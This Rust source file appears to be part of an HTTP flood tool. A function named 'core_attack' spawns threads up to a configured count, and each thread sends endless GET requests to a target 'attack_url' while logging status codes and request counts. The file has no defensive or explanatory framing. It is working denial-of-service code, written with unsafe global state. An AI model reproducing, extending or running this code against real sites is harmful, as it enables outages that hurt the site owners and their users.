use core::time;
use std::thread;

use reqwest::Response;
use tokio::time::Instant;

use crate::ram_manger::{SAFE_PUB_VAR, UNSAFEPUBVAR};
use crate::where_attack::AttackData;

pub async fn start(passed_var: AttackData) {
    loop {
        core_attack(&passed_var);
    }
}

fn core_attack(passed_var: &AttackData) {
    let error_threads = SAFE_PUB_VAR.lock();
    match error_threads {
        Err(_) => {}
        Ok(mut threads) => {
            if threads.thread_on + 1 < passed_var.threads {
                threads.thread_on += 1;
                unsafe {
                    UNSAFEPUBVAR.threads_on += 1;
                }
                drop(threads);
                tokio::spawn(async {
                    loop {
                        let now = Instant::now();
                        unsafe {
                            let error_data = request(&UNSAFEPUBVAR.attack_url);
                            match error_data.await {
                                Ok(status_code) => {
                                    UNSAFEPUBVAR.amount_sent += 1;
                                    println!(
                                        "Threads on {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
                                        UNSAFEPUBVAR.threads_on,
                                        status_code.status(),
                                        now.elapsed().as_secs(),
                                        UNSAFEPUBVAR.amount_sent,
                                    );
                                }
                                Err(data) => {
                                    println!(
                                        "Status ERROR {} Request per 10 Millisecond {}",
                                        data,
                                        UNSAFEPUBVAR.amount_sent
                                    );
                                }
                            }
                        }
                    }
                });
            } else {
                time_function();
            }
        }
    }
}

fn time_function() {
    unsafe {
        UNSAFEPUBVAR.threads_on += 1;
        loop {
            UNSAFEPUBVAR.amount_sent = 0;
            thread::sleep(time::Duration::from_millis(10));
        }
    }
}

async fn request(url: &String) -> Result<Response, reqwest::Error> {
    reqwest::Client::new().get(url).send().await
}
